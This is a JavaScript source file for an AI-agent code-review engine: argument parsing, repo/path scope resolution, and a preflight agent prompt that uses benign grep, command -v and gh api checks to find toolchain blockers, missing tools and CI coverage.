import { normalizeArgs } from '../lib/workflow-args.mjs'
import { DEPENDENCY_SOURCE_HOW } from '../lib/dependency-source.mjs'
import { parsePriorDecisions, reraisedBySeverity, priorDecisionsRefusedSection } from '../lib/prior-decisions.mjs'
import { MEMORY_RECALL_SCHEMA, memoryRecord, skippedMemory, mergeRecall, readLaunch, memorySection, recallDecisions } from '../lib/memory-recall.mjs'
import { isToolSource, toolDistinct, toolIdentity, holdsToolDistinct, MATCH_JUDGE_SCHEMA } from '../lib/prior-decision-match.mjs'
import { toolTitlesSection } from '../lib/tool-titles.mjs'
import { SCOPE_CHECK_SCHEMA, scopeCheckPrompt } from '../lib/prior-decision-scope.mjs'
import { deferralOn } from '../lib/ledger-deferral.mjs'
import { deferralReleased, priorRejectedSection, applyPriorDecisions } from '../lib/prior-decision-apply.mjs'
import { RULE_JUDGE_SCHEMA } from '../lib/project-rule-judge.mjs'
import { applyProjectRules, projectRuleSection } from '../lib/project-rule-apply.mjs'
import { findingCommentBody } from '../lib/finding-comment.mjs'
import { DIFF_LINES_SCHEMA, diffLinesPrompt, readDiffLines } from '../lib/diff-lines.mjs'
import { sortFindings, postable, doubtfulSection } from '../lib/finding-sort.mjs'
import { contradictionRecord, contradictionSection } from '../lib/memory-contradiction.mjs'
import { pathSegments } from '../lib/path-segments.mjs'
import { parseDepth, lightLenses, lightForcedLenses, lightCalledForLenses, depthVerifyTier, lightUnverifiedWhy, markVerdictLight, lightSection } from '../lib/review-depth.mjs'
import { parseExtraLenses, discoveryApplies, DISCOVERY_SKIPPED, pickRepoReviewers, extraLensSection } from '../lib/review-extra-lenses.mjs'
import { probeDeclarationBlock, auditPreflightProbes } from '../lib/preflight-probes.mjs'
import { isContractOrSchemaPath } from '../lib/contract-paths.mjs'
import { changesProductionCode } from '../lib/test-paths.mjs'
import { failedProfiles, gateRecord, savedSurfaceDrops, surfaceGateRecord, optionalTallyFrom } from '../lib/profile-merge.mjs'
import { supportedLangLabel, resolveProfilePin, unknownPinMessage, noLanguageMessage, noChangedFilesMessage, baseIsHead, onTrunkMessage, coverageGapFiles, resolveCoverage, nothingToReviewMessage, uncoveredNotRunNote, verdictSuffix, telemetryLostSection, canonicalSeverity, priorFoundSummary } from '../lib/review-coverage.mjs'
import { PATH_FLOOR_MARK, pathFloorNote, applyPathFloor } from '../lib/path-severity-floor.mjs'
import { sanitizeAttack, baseWhy, isHighSeverity, classifyRedTeam, adjudicateOne, shouldRedTeam, withoutAbsorbed, absorbedPromptBlock, absorbAcross, markTrackedUnverified, redTeamInvariant } from '../lib/review-adjudicate.mjs'
import { makeDeathBreaker } from '../lib/agent-retry.mjs'
import { decodeGitPath, sliceDiff, sliceableLens, WHOLE_DIFF_LENSES, LENS_WINDOW_AGENTS, pathspecLiteral } from '../lib/lens-scope.mjs'
import { makeDeadlineBudget, DEADLINE_HIT } from '../lib/agent-deadline.mjs'
import { makeLimitStop, limitStopAdvice } from '../lib/usage-limit.mjs'
import { honestVerdict, honestVerdictLine } from '../lib/honest-verdict.mjs'
import { summarizeFindings, reviewVerdict, refuteRate, fingerprint, matchesPrior, rereviewVerdict, reReviewMemory, branchFromAbbrevRef, ENGINE_REVISION, basisVerdictFromRevisions } from '../lib/run-record.mjs'
import { isAgentTypeMissing, agentUnavailableSection, agentUnavailableRecord } from '../lib/agent-fallback.mjs'
import { shq, loggerPrelude, quietly, checkpointPrompt, makeRunLogger, telemetryLossNoter } from '../lib/run-logging.mjs'
import { LEDGER_SHARD_PHASE, shardLedger, tombstoneRound, pruneTombstones, tombstoneBudget } from '../lib/ledger-shards.mjs'
import { ledgerRecordFields } from '../lib/ledger-in-shards.mjs'
import { withEarliestRound, roundYield, lensRoundYield, unattributedCount } from '../lib/lens-round-yield.mjs'
import { VERIFY_WINDOW_AGENTS, verifyWeight, weightedWindow } from '../lib/review-waves.mjs'
import { makeVerdictFloor, verdictNeutralNow, floorSkipReason } from '../lib/verify-economy.mjs'
import { PRIOR_ROUND_SCHEMA, DETECT_SCHEMA, SCOUT_SCHEMA, GATE_SCHEMA, FINDINGS_SCHEMA, VERDICT_SCHEMA, CRITIC_SCHEMA, AGENT_DEFINITIONS_SCHEMA, CHANGED_SCHEMA, PR_COMMENTS_SCHEMA, ADJUDICATE_SCHEMA, ATTACK_SCHEMA } from '../lib/review-schemas.mjs'
import { flattenField, promptFields, isCommitish } from '../lib/prompt-fields.mjs'
import { PROFILES } from '../lib/review-profiles.mjs'
import { ledgerTruncated, ledgerDegraded, shouldFullRescan } from '../lib/rescan-guards.mjs'
import { verifyPrompt, BATCH_SIZE, verifyTier, NOT_VERIFIED, votesAgree, tierFromVotes, batchVerifyPrompt } from '../lib/review-verify.mjs'
import { sameSpotGroups } from '../lib/review-same-spot.mjs'
import { toLedgerEntry } from '../lib/review-ledger-entry.mjs'

export const meta = {
  name: 'review',
  description: 'Elastic deep review of a diff — auto-detects the language(s) touched, scout-scaled lens fan-out, loop-until-dry, tool-grounded seed findings, adversarial + self-verification, synthesized into one Confirmed/Suspected/Unverified report with a verdict. Rust and Nix profiles built in.',
  whenToUse: 'The single review path for any diff/PR before commit or merge. The engine itself always recalls the active decisions, questions and project rules for the paths of the diff through the craft:memory skill; priorDecisions is optional and ADDS to that recall, never replaces it (merged by id, the recalled record kept on a clash; an empty list adds nothing; a passed record may leave out id when it carries kind, title and scope, the id then derived from them by the memory skill rule), and the report names both parts. To post findings on a PR pass comment — never post findings by hand: only comments from the engine carry the marker that ties a later rejection to its finding. With comment only defects are posted: a doubtful finding (not confirmed, raised by the compat, intent or api-boundary lens, about rollback, rollout, old replicas, migration or a breaking change, or outside the changed lines) is listed under Doubtful — for the reviewer, not posted, numbered as the run record keeps it; show that list to the human and, for each he chooses, post it as a question or a defect only through the craft:addressing-findings posting script. Auto-detects language; pin with args.languages (e.g. ["rust"] or ["nix"]). Scales depth to the diff automatically. To review ANOTHER repository pass repo=<absolute path> — without it every git command runs in the checkout the session itself sits in; path= is a repo-relative pathspec, NOT a way to select the repo. The performance / api-idioms / api-boundary lenses are an OPTIONAL pass that is OFF by default — request it with optional=true (or optional=performance,api-boundary); every report names what it skipped. priorDecisions — ONLY inside an object argument, {priorDecisions: [<decision, question and rule records the launcher holds beyond what the engine recalls, such as rejections read from PR threads>]}; as a string (key=value or JSON text) it is refused and nothing of it applied, and in a key=value string nothing after it is read as an option — sets aside a finding the project already rejected — listed under Rejected before with who, when, why and a link, never dropped — unless it is Critical/High or its scope changed since the commit of the decision; a finding an active question (a deferred finding) answers is listed under Known and deferred by the same rules; a finding a judge puts under an active project rule (a stance on a whole class of findings) is listed under Covered by project rules, out of the verdict and never posted, unless it is Critical; a malformed value applies nothing and is named in the report. depth=light is a cheaper pass: one round of the diff-scoped lenses only (no negative-space or invariants; tests and intent still run whenever the diff changes production code, reconciler and failure-windows on controller code, compat on a public contract path), no completeness critic, and only Medium and above verified; its verdict and report say light pass and name what it skipped, and the run record carries depth (default depth=full, the review as it was). The engine accepts only depth=light (any other value runs full): routing a "quick" or "light" request to it belongs to the calling skill or hook. The consumer repository\'s own reviewing agents can run as extra lenses in the same run: each reviews the whole change and its findings go through the same verification and verdict. On a light pass with extraLenses absent, the engine discovers them among the .claude/agents of the project the session runs in, and only when repo= is absent or names that project or one of its worktrees (a foreign repo skips discovery and the report says so) (an agent that reviews and has no edit tool -- its tools list names none, or its disallowedTools take them all away -- told to stay read-only; the report says when none was found); a full review runs them only when named. extraLenses=[<agentType>, ...] (an object argument, e.g. {extraLenses: ["reviewer"]}) names them at either depth, and extraLenses=[] turns them off; a named agent that is unknown or fails is a coverage gap (INCOMPLETE), never a failed run; a discovered one that cannot run is reported as such, never a gap. The report names which extra lenses ran and how they were chosen. deadlineMs=<ms> is a diagnostic knob, not a review option: it replaces the per-phase wall-clock deadline table wholesale and will kill healthy lenses if set below their real duration.',
  phases: [
    { title: 'Scout', detail: 'cheap classification: resolve the diff base, detect language(s), classify size/categories, pick lenses (rigor is derived from the size, in code)', model: 'haiku' },
    { title: 'Gate', detail: 'per-language CI-aware mechanical gate + tool-grounded seed findings' },
    { title: 'Lenses', detail: 'parallel per-lens review with context expansion; loop-until-dry' },
    { title: 'Verify', detail: 'cross-lens dedup, then adversarial refutation + self-verification of each finding' },
    { title: 'Synthesize', detail: 'calibrate severities, completeness critic, one merged report' },
  ],
}

export async function __run() {

/**
 * @typedef {Awaited<ReturnType<typeof reviewProfile>>} Result  one profile's facts from reviewProfile
 * @typedef {{ sizeBucket: string, lenses: string[], maxRounds: number, verifyVotes: number, lensModel: string, isLibrary: boolean, securitySensitive: boolean, intent: string, spec: string, churn: string[] }} Plan
 * @typedef {PriorRoundAnswer} PriorRound  the loaded prior round (loader agent output)
 * @typedef {ReturnType<typeof sliceDiff>[number]} Slice
 * @typedef {AgentOptions & { deadlineMs?: number | undefined, breaker?: ReturnType<typeof makeDeathBreaker> | null | undefined, inSessionDir?: boolean | undefined, bookkeeping?: boolean | undefined }} AgentOpts  agent() options plus the four this engine strips (inSessionDir: no `repo` cd, the agent works where the session started; bookkeeping: a record write, dispatched even after a usage limit); closed, so a misspelt option is a type error
 * @typedef {import('../lib/review-schemas.mjs').Finding} Finding
 * @typedef {import('../lib/review-profiles.mjs').Preflight} Preflight
 * @typedef {import('../lib/review-profiles.mjs').Ctx} Ctx
 * @typedef {import('../lib/review-profiles.mjs').Profile} Profile
 */
/**
 * @template T
 * @typedef {import('../lib/review-schemas.mjs').Schema<T>} Schema
 */
/**
 * The answers of the schema'd agents (lib/review-schemas.mjs).
 * @typedef {import('../lib/review-schemas.mjs').PreflightAnswer} PreflightAnswer
 * @typedef {import('../lib/review-schemas.mjs').LedgerAnswer} LedgerAnswer
 * @typedef {import('../lib/review-schemas.mjs').PriorRoundAnswer} PriorRoundAnswer
 * @typedef {import('../lib/review-schemas.mjs').DetectAnswer} DetectAnswer
 * @typedef {import('../lib/review-schemas.mjs').ScoutAnswer} ScoutAnswer
 * @typedef {import('../lib/review-schemas.mjs').GateAnswer} GateAnswer
 * @typedef {import('../lib/review-schemas.mjs').FindingsAnswer} FindingsAnswer
 * @typedef {import('../lib/review-schemas.mjs').BatchVerdictAnswer} BatchVerdictAnswer
 * @typedef {import('../lib/review-schemas.mjs').AgentDefinitionsAnswer} AgentDefinitionsAnswer
 * @typedef {import('../lib/review-schemas.mjs').AdjudicateAnswer} AdjudicateAnswer
 * @typedef {import('../lib/review-schemas.mjs').CheckpointAnswer} CheckpointAnswer
 * @typedef {import('../lib/review-schemas.mjs').DedupAnswer} DedupAnswer
 */

// ---- args ----
// Three plausible spellings arrive here — a real object, a JSON string, and the `key=value` form the
// skill's own invocation line advertises — and only the first used to work. The other two fell
// through every `typeof args === 'object'` guard, so every option reverted to its default and the
// run reviewed whatever the session was sitting in, then reported a confident verdict for a diff
// nobody asked about. Shared with every other engine (lib/workflow-args.mjs).

// How to find a pinned dependency's source, shared with the other prompts that demand opening it.
/** @type {Record<string, unknown>} */
const A = normalizeArgs(args, log)
/** A string argument as given, or '' when it is absent or falsy. @param {string} argName */
function argString(argName) {
  return A[argName] ? String(A[argName]) : ''
}
const baseArg = argString('base')
const intentArg = argString('intent')
const postComments = !!A['comment']
let pathArg = argString('path')   // optional crate-scope (audit per-crate fan-out)
// Absolute path to the repo under review, when it is NOT the directory the session runs in. Without
// it every agent runs `git diff` wherever the session happens to sit, so craft could only ever review
// its own checkout — reviewing a PR in another repo silently reviewed craft instead.
let repoArg = argString('repo')
// `path` is a git PATHSPEC resolved against the reviewed repo; `repo` selects the repo. An ABSOLUTE
// `path` is therefore ambiguous in the one way the sandbox cannot resolve: it is either a repo the
// caller meant to select, or a directory INSIDE the repo they meant to narrow to — and with no disk
// and no Node API here, nothing can tell those apart. Both wrong guesses are expensive and neither
// is loud. Guessing "repo" turns a narrowing request into a confident WHOLE-repo review wearing the
// narrow label; leaving it as a pathspec matches nothing, and the run comes back as an empty diff
// that reads like "no changes" — measured 2026-09-17 at 57 agents and 2.04M tokens, every one of
// the 14 lenses independently rediscovering that there was nothing to read.
// So: resolve it when the prefix DECIDES it, and refuse to guess otherwise (realm @nick/craft, #65).
// `~` counts as absolute here because the agent's shell expands it before git ever sees the pathspec.
const ABSOLUTE_PATH = /^(\/|~(\/|$)|[A-Za-z]:[\\/])/
let ambiguousPath = ''
// A scope the caller asked for and did NOT get. It rides into `notRun` and therefore into the
// verdict line, not only into `log()`: dropping a narrowing widens the review to the WHOLE repo, so
// what was ordered and what was done diverge — and the person who reads the verdict is not the
// person who reads the log. An INCOMPLETE marker is the honest rendering of "we reviewed something
// else than you asked for", however green the findings are.
/** @type {string[]} */
let scopeNotRun = []
// The reader-facing twin of `scopeNotRun`: the same refusal spelled with this run's own paths, for
// the report. Kept apart because `notRun` is ranked by exact string (see the assignment below).
let scopeDetail = ''
// Containment decided on NORMALIZED SEGMENTS rather than on a raw string prefix. `repo=/r/` with
// `path=/r/./crates/../crates/core` is the same request as `repo=/r` with `path=crates/core`, and a
// prefix comparison reads it as "outside" — which silently WIDENS the review to the whole repository.
// Segments also settle the sibling case (`/r-evil` is not inside `/r`) that a bare `startsWith`
// accepts unless the separator is appended by hand.
// WHAT STAYS OUTSIDE THIS GUARD, because the sandbox has no disk and no Node API: a SYMLINK cannot be
// resolved (a path reaching the repo through a symlinked directory reads as outside), the comparison
// is case-SENSITIVE while macOS and Windows filesystems are not (`/R/crates` under `repo=/r` reads as
// outside), and a `..` that would climb above the first segment is kept as a literal segment, so such
// a path matches nothing. All three misread in the SAME direction — the scope is dropped, and a
// dropped scope is now reported in the verdict and in `notRun` — never in the direction of a
// narrowing that looks honoured and is not.
// The dropped scope, rendered into whichever report is returned — every early exit included, since
// the drop happened before all of them. Appended to the synthesized report too rather than asked of
// the synthesis model: what the review DID NOT cover is not something a prompt may forget.
const scopeSection = () => (scopeNotRun.length ? `\n\n## Scope\n⚠️ ${scopeDetail || scopeNotRun.join('\n⚠️ ')}\n` : '')
// The recalled rejections the launching session hands in as `priorDecisions` (realm @nick/craft, node #177 — the
// memory skill's record shape) are read by lib/prior-decisions.mjs; the rules and why live in the module.

// The PR comment body for a Confirmed finding, with the marker a later session reads back.
// The lines the diff changed, and the sorting of findings before publication (realm @nick/craft, nodes #270, #277).

// The repo-relative spelling of `abs`, or null when `abs` is not inside `repo`.
/** @param {unknown} abs @param {unknown} repo */
function relativeToRepo(abs, repo) {
  const r = pathSegments(repo)
  const p = pathSegments(abs)
  if (!r.length || p.length < r.length) return null
  for (let i = 0; i < r.length; i++) if (p[i] !== r[i]) return null
  return p.slice(r.length).join('/')
}
// Settles an absolute `path` against `repo` once, before anything is dispatched.
function resolveScopePath() {
  if (ABSOLUTE_PATH.test(pathArg)) {
    const rel = repoArg ? relativeToRepo(pathArg, repoArg) : null
    if (rel != null) {
      // It names a directory inside the repo under review: that is a SCOPE, spelled absolutely. Keep
      // the narrowing the caller asked for — dropping it here would silently widen the review.
      log(`⚠️ path=${pathArg} is absolute but sits inside repo=${repoArg} — read as the repo-relative scope ${shq(rel)}.`)
      pathArg = rel
    } else if (repoArg) {
      const msg = `the requested scope path=${pathArg} was DROPPED: it is ABSOLUTE and does not resolve inside repo=${repoArg}, and an absolute pathspec matches nothing (the review would have seen an EMPTY diff). The review below therefore covers the WHOLE repository, not the requested scope — re-run with a repo-relative path to narrow it.`
      log(`⚠️ ${msg}`)
      // TWO STRINGS ON PURPOSE. `msg` is for a reader — it names this run's path and repo, and it
      // reaches the report's Scope section. `scopeNotRun` feeds the run record's `notRun`, which
      // lib/analyze-runs.mjs ranks BY EXACT STRING to surface repeated fragility: a path in there
      // makes every dispatch of the same shape its own count-1 row and sinks the real repeats. Same
      // argument that moved the uncovered-files note out of `notRun` entirely.
      scopeNotRun = ['the requested scope was DROPPED — an absolute `path` that does not resolve inside `repo`, so the review covered the whole repository instead']
      scopeDetail = msg
      pathArg = ''
    } else {
      // No `repo` to decide against. Refusing costs nothing and says exactly what to do; either guess
      // costs a full run and reports a scope nobody asked for.
      ambiguousPath = pathArg
    }
  }
}
resolveScopePath()
// Where craft itself lives, so the logger can find lib/craft-log-run.mjs. As an installed plugin
// CLAUDE_PLUGIN_ROOT is set for us; when the engine is launched by scriptPath from a checkout it is
// NOT, and the `:-.` fallback would resolve against the REVIEWED repo — the script would simply not
// be there and the whole record would be lost to a "Cannot find module". Pass craftRoot then.
const craftRootArg = argString('craftRoot')
// Every logger command runs as `cd <reviewed repo> && node <logger>`, so the `:-.` fallback would be
// resolved AFTER the cd — against the reviewed repo, where the script is not. That lost every
// checkpoint, the finalize record and the prior-round chain to "Cannot find module", silently.
// Resolve the path to an absolute one FIRST, in a variable, then change directory. The prelude
// itself is shared with every other record-filing engine (lib/run-logging.mjs).
// A FUNCTION, not a constant, and the reason is mechanical: `CRAFT_VERSION` is declared far below
// (release-please owns that line and its position), so computing the prelude here would either hit
// the temporal dead zone or — as it did for one commit — quietly omit the version and leave this
// engine's third logger command, the prior-round read, refusing exactly as before the fix while the
// other two found their script. Deferring the call to use time is what lets all three agree.
const loggerPreludeNow = () => loggerPrelude(craftRootArg, CRAFT_VERSION, repoArg)
const LOGGER_PATH = '"$CRAFT_LOGGER"'
const viaArg = argString('_via')   // set by a parent workflow (e.g. rust-audit)
const strict = !!A['strict']   // harsh maintainability mode: confirmed maintainability findings become presumptive blockers
// The project's recorded rejections, passed by the launcher: they ADD to what this engine recalls itself
// once the diff's paths are known (recallMemory). Malformed → nothing of it applied, and every report says what was refused.
// Set by a parent workflow (rust-audit) that already recalled for this run and forwards the merged
// list: no recall here. `_memory` is that recall's outcome when it found none; `_memoryParts` how the
// list splits into its recall's records and its launcher's.
const recalledByLauncher = A['_recalled'] === true
const launch = readLaunch(A['priorDecisions'], recalledByLauncher, argString('_memory'), A['_memoryParts'], parsePriorDecisions)
let priorDecisionsIn = launch.prior
// Where the decisions came from; every report names it.
let memory = launch.memory
for (const r of priorDecisionsIn.refused) log(`⚠️ priorDecisions: ${r}`)
// The pin, RAW. Normalising it here as well as in `resolveProfilePin` is what made the helper's
// hardening unreachable: an `Array.isArray` guard here turned a scalar `languages: 'rust'` into
// `null` (pin silently dropped, review auto-detected instead), while a `.map(String)` turned
// `[null]` into the string `'null'` — an "unknown id" that hard-aborted the run. One normalizer:
// `resolveProfilePin` is the single place that decides what a pin means.
const requestedLangs = A['languages']
const freshArg = !!A['fresh']   // force a full first-pass review, ignore any prior round
// Every Nth re-review re-scans the FULL base...HEAD diff instead of only the fix delta, so a defect in
// code an intermediate round did not touch is re-discovered. Default 3; 1 = every re-review is a full
// re-scan (stateless, like adversarial-review); 0 = never (pure incremental — the pre-guard behavior).
const fullEvery = fullEveryArg()
/** @returns {number} */
function fullEveryArg() {
  return (A['fullEvery'] != null) ? Math.max(0, Number(A['fullEvery'])) : 3
}

// realm @nick/craft, node #295: `depth: 'light'` runs one round of the diff-scoped lenses and verifies
// Medium and above only; `extraLenses: [<agentType>, ...]` runs the consumer's own agents as lenses
// in the same run. The default depth, 'full', is the review as it was, plan for plan.
const depthRequest = parseDepth(A['depth'])
const reviewDepth = depthRequest.depth
const lightPass = reviewDepth === 'light'
function warnUnknownDepth() {
  if (depthRequest.unknown) log(`\u26a0\ufe0f depth=${JSON.stringify(depthRequest.unknown)} is not a depth (full, light) -- running the full review`)
}
warnUnknownDepth()
const extraLensRequest = parseExtraLenses(A['extraLenses'], lightPass)
/** The whole-diff lenses a light pass did not dispatch, across profiles. @type {Set<string>} */
const lightSkippedLenses = new Set()
/** The whole-diff lenses a light pass did dispatch, across profiles. @type {Set<string>} */
const lightKeptLenses = new Set()
/** Whether any profile reached its lens phase: a light report on an earlier exit says no lens ran. */
let lensPhaseReached = false
/** The extra lenses that answered, and those that did not, each with the class of its failure. */
const extraLensOutcome = { ran: /** @type {string[]} */ ([]), failed: /** @type {{ agent: string, why: string }[]} */ (extraLensRequest.refused.map(agentTypeName => ({ agent: agentTypeName, why: 'not an agent type name' }))), discovery: '', reached: false, exit: /** @type {{ reason: string, needed: boolean } | null} */ (null) }


// ---- preflight: resolve the environment ONCE, before anything expensive ----
// This used to be improvised inside the gate agent, which learned it the expensive way — a measured
// run spent 50s discovering it was outside the repo's dev shell and 113s discovering the crate cannot
// compile without a database, and reported neither signal. Worse, every agent that later runs a tool
// (the gate, a lens re-running clippy, a verifier doing its MECHANICAL CHECK) rediscovered the same
// facts independently. Resolve them once, cheaply, and hand the answer to everyone downstream.
// The probe budget and its audit live in lib/preflight-probes.mjs, a linted module with real unit tests.
// The module's header carries why the audit is a DECLARATION audit and what that does and does not close.
/** @type {Schema<PreflightAnswer>} */
const PREFLIGHT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['runner', 'blockers', 'missingTools', 'ciCovers', 'probes', 'partial', 'notes'],
  properties: {
    runner: { type: 'string', description: 'prefix every build/lint command needs, e.g. "direnv exec . " or "nix develop -c " — empty string if commands run bare' },
    blockers: { type: 'array', items: { type: 'string' }, description: 'reasons this tree CANNOT compile here, one per line, e.g. "sqlx query macros need a live Postgres; no offline .sqlx cache and no DATABASE_URL"' },
    missingTools: { type: 'array', items: { type: 'string' }, description: 'gate tools not on PATH (cargo-audit, cargo-deny, semgrep, …)' },
    ciCovers: { type: 'array', items: { type: 'string' }, description: 'signals a GREEN CI check already establishes for this exact HEAD, as "<signal> via <check name>" — e.g. "test via cargo nextest", "deny-bans via cargo-deny"' },
    // `minItems`/`minimum` are load-bearing, not decoration: without them `probes: []` and a negative
    // count were both VALID answers that the audit then read as clean — the cheapest possible path to
    // a green audit. The schema now refuses the shape and `auditPreflightProbes` refuses it again.
    probes: { type: 'array', minItems: 1, description: 'one entry per source consulted, with how many shell/API invocations it cost — audited against PROBE_BUDGETS; never empty, not even in a partial result, since it reports what was already done', items: { type: 'object', additionalProperties: false, required: ['source', 'calls'], properties: { source: { type: 'string', description: 'the probe-source id from the prompt\'s list, exactly' }, calls: { type: 'integer', minimum: 0, description: 'invocations spent on that source, including ones that returned nothing' } } } },
    partial: { type: 'boolean', description: 'true if ANY of the four fields was left unfinished (ran out of time, a command failed, gh unavailable) — the matching field is then empty and notes says which and why' },
    notes: { type: 'string' },
  },
}
/** @param {Profile} profile @param {Ctx} ctx */
function preflightPrompt(profile, ctx) {
  return `You are the PREFLIGHT for a ${profile.lang} review: resolve, cheaply and once, what the later steps must not rediscover. Diff base: ${ctx.baseRef ? `\`${flattenField(ctx.baseRef)}\`` : 'uncommitted changes / most recent commit'}.

This is reconnaissance, NOT the gate. Run nothing that compiles, builds, or takes more than a few seconds. Every answer below comes from reading the working tree or asking the API.

1. RUNNER. Does this repo pin its toolchain and system libraries in a dev shell? Look for \`.envrc\`, \`flake.nix\`, \`shell.nix\`, \`.direnv/\`. If so and \`direnv\`/\`nix\` is on PATH, the prefix is \`direnv exec . \` (preferred when \`.envrc\` exists and is allowed) or \`nix develop -c \`. Verify it works with something instant — \`<prefix>rustc --version\` or \`<prefix>true\` — never with a build. Outside such a shell, system libraries (openssl, protobuf, pkg-config) are absent and any build dies in a C dependency unrelated to the diff. Empty string only if the repo genuinely needs no prefix.

2. BLOCKERS — things that make a local build impossible no matter how long it runs, so nobody downstream wastes minutes proving it:
${profile.id === 'rust'
    ? `   - compile-time-checked SQL: \`sqlx\` in \`Cargo.lock\` with NO offline cache (no \`.sqlx/\` at the repo root or in the changed package) and no \`DATABASE_URL\` — every query macro tries to reach a live database and the crate fails to compile.
   - a build script or macro that needs a generated file, a private registry token (\`CARGO_REGISTRIES_*\`), or a service that is not running.
   - a toolchain the repo pins (\`rust-toolchain.toml\`) that is not installed and cannot be fetched offline.`
    : `   - an input the flake cannot fetch offline, a private registry/token the evaluation needs, or a builder platform this machine is not (\`system\` mismatch).`}
   Do this MECHANICALLY, not by judgement — these are \`grep\`/\`test\` questions with yes-or-no answers, and the one time this was left to inference the blocker was missed and the gate paid for a doomed compile anyway:
${profile.id === 'rust'
    ? `   \`\`\`
   grep -q '^name = "sqlx"' Cargo.lock && echo SQLX
   ls -d .sqlx */.sqlx **/.sqlx 2>/dev/null            # offline cache anywhere in the tree
   [ -n "$DATABASE_URL" ] && echo HAS_DB_URL
   \`\`\`
   SQLX present, no \`.sqlx\` directory found and no \`DATABASE_URL\` ⇒ report the blocker. Run those three commands; do not reason about whether the crate "probably" builds.`
    : `   Check the concrete inputs: \`nix flake metadata\` resolving offline, and whether the flake's \`system\` matches this machine.`}
   Report each blocker as one plain line naming what cannot run and WHY. Report nothing you have not actually checked.

3. MISSING TOOLS. Which of ${profile.id === 'rust' ? '`cargo-audit`, `cargo-deny`, `cargo-semver-checks`, `semgrep`' : '`statix`, `deadnix`, `nixpkgs-fmt`/`alejandra`, `nix-instantiate`'} are genuinely unavailable? ONE command answers it for every tool at once — run it exactly, do not probe tool-by-tool:
   \`\`\`
   for t in ${profile.id === 'rust' ? 'cargo-audit cargo-deny cargo-semver-checks semgrep' : 'statix deadnix nixpkgs-fmt alejandra nix-instantiate'}; do
     p=$(command -v "$t" 2>/dev/null); [ -z "$p" ] && [ -x "$HOME/.cargo/bin/$t" ] && p="$HOME/.cargo/bin/$t"
     echo "$t: \${p:-MISSING}"
   done
   \`\`\`
   A dev shell usually has a NARROWER PATH than the login shell, so if the runner prefix from step 1 is non-empty, run the same loop once more under it and treat a tool as PRESENT if EITHER pass found it — that mistake silently dropped the entire \`cargo audit\` signal from a real run. Name the invocation that works (e.g. "cargo-audit: ~/.cargo/bin/cargo-audit, outside the dev shell"). Only a tool MISSING in both passes goes in \`missingTools\` — an absent tool is an intentional skip downstream, never a failure.

4. CI COVERAGE. Which signals does a GREEN check already establish for THIS EXACT commit? TWO calls answer it, both SHA-scoped — the check-runs endpoint and the commit-status endpoint. Run those two, once each, and NOTHING else — in particular do NOT run \`gh pr checks\` and do NOT look the PR up by commit: those resolve by branch (empty on a review worktree or detached HEAD) or hand you a PR whose head may have moved past your commit, and both then need the SHA test this call satisfies by construction.
   \`\`\`
   SHA=$(git rev-parse HEAD)
   gh api "repos/{owner}/{repo}/commits/$SHA/check-runs" --jq '.check_runs[] | "\\(.name) \\(.status) \\(.conclusion)"'
   gh api "repos/{owner}/{repo}/commits/$SHA/status" --jq '.statuses[] | "\\(.context) completed \\(.state)"'
   \`\`\`
   Owner/repo from \`git remote get-url origin\`. Both calls, once each: check-runs alone misses CI that reports through the older commit-status API, and that omission looks exactly like "no CI". Keep only \`completed\` rows whose conclusion/state is \`success\`.
   Then read the workflow behind a green check to learn what it ACTUALLY runs, not what its name suggests: a job called \`cargo-deny\` running \`check bans\` covers bans and NOT advisories or licenses, and that distinction is the whole value of this step. HARD CAP — this is where the pass runs away with the clock: read AT MOST 2 workflow files, only for green checks that map to a gate signal (build/test/clippy/fmt or a security tool). Never enumerate \`.github/workflows/*\` wholesale. Past the cap, the remaining green checks go in \`notes\` BY NAME ONLY and NEVER in \`ciCovers\` — \`ciCovers\` means "do not re-run this locally", and a check whose workflow you did not open cannot support that: its name is a guess at what it ran, which is exactly what the \`cargo-deny\`/\`check bans\` example above shows going wrong. Only a signal you read the workflow for goes in \`ciCovers\`.
   List one entry per covered signal, e.g. "test via cargo nextest", "deny-bans via cargo-deny (command: check bans)". If gh is missing, unauthenticated or offline, return an empty list and say so in notes.

${probeDeclarationBlock()}

BUDGET (hard): reconnaissance, target ~90 seconds, three minutes is the ceiling. Past the dispatch deadline nothing cuts you off — the caller simply STOPS WAITING for you and dispatches a second preflight, so everything you do after that point is discarded and paid for twice, and if the second pass is as slow the gate loses even the runner prefix. So at three minutes STOP and RETURN. A thorough preflight costing more than the steps it saves is a net loss (measured: the first version took 207s and made the gate+preflight pair SLOWER than the gate had been alone). Never run a build, a test, or a full lint here.

PARTIAL RESULTS ARE THE EXPECTED SHAPE, NOT A FAILURE — but they must be legible as partial. Any of the four FINDINGS fields above (runner, blockers, missingTools, ciCovers) you did not finish: set \`partial: true\`, return the field EMPTY, and open \`notes\` with \`PARTIAL: <field> not established (<why>)\`, one clause per unfinished field. \`partial\` is the flag downstream reads — the note explains it, it does not replace it. An empty \`ciCovers\` with no such note means "CI covers nothing", and a downstream step will re-establish every signal locally on that reading — so never let "I ran out of time" arrive looking like "I checked and there was nothing".
\`probes\` (step 5) IS EXPLICITLY EXCLUDED FROM THAT INSTRUCTION: it is not a finding but a report of what you ALREADY DID, so it can never be returned empty — a run cut short declares the calls it had already spent, and an empty \`probes\` is read as a violation, never as a disciplined pass.

Return runner, blockers, missingTools, ciCovers, probes, partial, notes.`
}
// An unfinished preflight must not be recorded as a clean one. The schema carries an explicit
// `partial` boolean precisely so this does not hang on the shape of prose: the earlier test was
// anchored at the start of the note, so one clause of preamble before the marker
// ("Ran out of time. PARTIAL: ciCovers …") produced status 'ok' over unfinished fields. The note is
// still consulted, unanchored, as a fallback for a model that writes the prose but omits the flag.
// The fallback matches only the MARKER the prompt mandates — uppercase `PARTIAL:` — never the bare
// word: `notes` now also carries CI CHECK NAMES (the past-the-cap list), and a green check called
// `partial-build` matched `/\bPARTIAL\b/i` and flipped a complete preflight to 'partial'.
/** @param {Preflight | null | undefined} pf */
function preflightIsPartial(pf) {
  if (!pf) return false
  if (pf.partial === true) return true
  return /\bPARTIAL:/.test(flattenField(pf.notes || ''))
}


// Admitted by a code signal, never by a floor. See `blanketLenses()` in planFor: a blanket roster fill
// says "nothing is known about this diff", which is not a reason to pay for the roster's most
// expensive lens. `failure-windows` is gated on the scout having CHOSEN `reconciler` (controller
// code); nothing else here yet, and the list exists so the next such lens has somewhere to be
// declared rather than becoming a fourth blanket exception.
const CONDITIONAL_LENSES = ['failure-windows']

// realm @nick/craft #102: each expensive whole-repo lens fires only if the diff touches the surface its defect class needs; fail-open.
